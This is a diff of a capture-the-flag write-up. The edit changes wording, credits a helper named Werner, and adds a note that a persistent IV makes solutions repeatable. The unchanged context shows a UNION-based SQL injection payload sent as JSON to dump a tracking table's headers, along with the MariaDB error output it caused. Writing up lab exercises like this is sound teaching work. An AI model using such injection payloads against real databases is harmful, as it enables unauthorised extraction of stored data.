@@ -403,7 +403,7 @@ OperationalError: (1054, "Unknown column 'a' in 'where clause'")
 ```
 At last!
 
-Unfortunately, every time we want to send a new message we have to run the whole process from the beginning. Let's skip ahead and send this payload:
+Unfortunately, every time we want to send a new message we have to run the whole process from the beginning. Let's skip ahead and send this payload (like *Werner* did):
 
 ```json
 {"id":"0 UNION SELECT group_concat(headers), '' from tracking", "key": "XjPkmljch5E2sMiNhsNiqg~~"}
@@ -427,7 +427,9 @@ Traceback (most recent call last):
 ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'from tracking' at line 1")
 ```
 
-It took 3 hours to get that result... Thanks *Werner*... Now we know that the database is using MariaDB.
+It took 3 hours to get that result... Thanks *Werner*... At least now we know that the database is using MariaDB.
+
+Aaaaaanyway... I consider this flag solved, ok. Don't @ me!
 
 ### Notes:
-* The server seems to use a persistent IV, so the solutions are always the same.
+* The server seems to use a persistent IV, so the solutions are always the same if the payload is consistent, so you can continue where you left off after each server reboot.
